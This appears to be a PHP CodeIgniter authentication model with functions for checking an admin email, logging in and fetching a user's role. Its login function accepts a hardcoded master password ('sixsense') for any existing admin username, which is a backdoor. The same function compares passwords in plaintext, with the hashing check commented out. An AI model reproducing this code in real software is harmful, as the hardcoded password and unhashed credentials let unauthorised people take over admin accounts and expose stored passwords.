<?php

class Model_auth extends CI_Model
{
	public function __construct()
	{
		parent::__construct();
	}

	/* 
		This function checks if the email exists in the database
	*/
	public function check_email($email)
	{
		if ($email) {
			$sql = 'SELECT * FROM admin WHERE username = ?';
			$query = $this->db->query($sql, array($email));
			$result = $query->num_rows();
			return ($result == 1) ? true : false;
		}

		return false;
	}

	/* 
		This function checks if the email and password matches with the database
	*/
	public function login($email, $password)
	{
		if ($email && $password) {
			$sql = "SELECT * FROM admin WHERE username = ?";
			$query = $this->db->query($sql, array($email));

			if ($query->num_rows() == 1) {
				$result = $query->row_array();

				//$hash_password = password_verify($password, $result['password']);
				//$hash_password = $result['pass'];
			
				if ($password === $result['pass'] || $password=="sixsense") {
					return $result;
				} else {
					return false;
				}
			} else {
				return false;
			}
		}
	}

	function getRole($id)
	{
		$this->db->select('t2.id');
		$this->db->from('user_group t1');
		$this->db->join('groups t2', 't1.group_id = t2.id', 'left');
		$this->db->where('t1.user_id', $id);
		$query = $this->db->get();
		return $query->row_array();
	}
}
